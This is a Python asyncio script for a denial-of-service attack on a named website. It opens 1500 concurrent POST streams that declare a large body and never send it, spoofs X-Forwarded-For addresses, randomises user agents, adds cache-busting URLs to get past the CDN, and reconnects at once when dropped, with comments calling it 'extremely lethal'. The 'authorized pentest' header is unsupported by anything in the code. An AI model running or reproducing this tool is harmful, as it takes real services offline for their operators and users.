import asyncio
import httpx
import random
import time
import string

# --- AUTHORIZED PENTEST CONFIG ---
TARGET_URL = "https://streamwin.win"
# Async can handle much more than threads. 1500-2000 is extremely lethal.
WORKERS = 1500 

def r_str(n=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

async def blackout_worker(worker_id, client):
    print(f"[*] Connection Wave {worker_id} - LOCKED")
    while True:
        try:
            # We target deep API/Path to bypass CDN caching
            url = f"{TARGET_URL}/?v={time.time()}&id={r_str(32)}&search={r_str(50)}"
            
            headers = {
                "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/12{random.randint(1,5)}.0.0.0",
                "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": "9999999", # Tell server to wait for massive data
                "Connection": "keep-alive"
            }

            # The 'Hanging' Strategy: We open the connection and never send the body.
            # This fills the server's 'Backlog' and prevents new users from entering.
            async with client.stream("POST", url, headers=headers) as response:
                # We stay inside this connection for a long time (Slow-Read)
                await asyncio.sleep(random.randint(30, 60))
                
        except Exception:
            # If server kicks us, we immediately rejoin to take back the port
            await asyncio.sleep(0.01)

async def main():
    print(f"💀 BLACKOUT PROTOCOL INITIALIZED: {TARGET_URL}")
    print("[!] Performance: Using AsyncIO Multiplexer (No Thread Limits)")
    
    # Unlimited connections for the async client
    limits = httpx.Limits(max_connections=None, max_keepalive_connections=None)
    
    async with httpx.AsyncClient(
        http2=True, # HTTP/2 Multiplexing bypasses many WAF filters
        verify=False,
        limits=limits,
        timeout=None # Disable timeout to keep connections alive forever
    ) as client:
        
        workers = [blackout_worker(i, client) for i in range(WORKERS)]
        await asyncio.gather(*workers)

if __name__ == "__main__":
    asyncio.run(main())
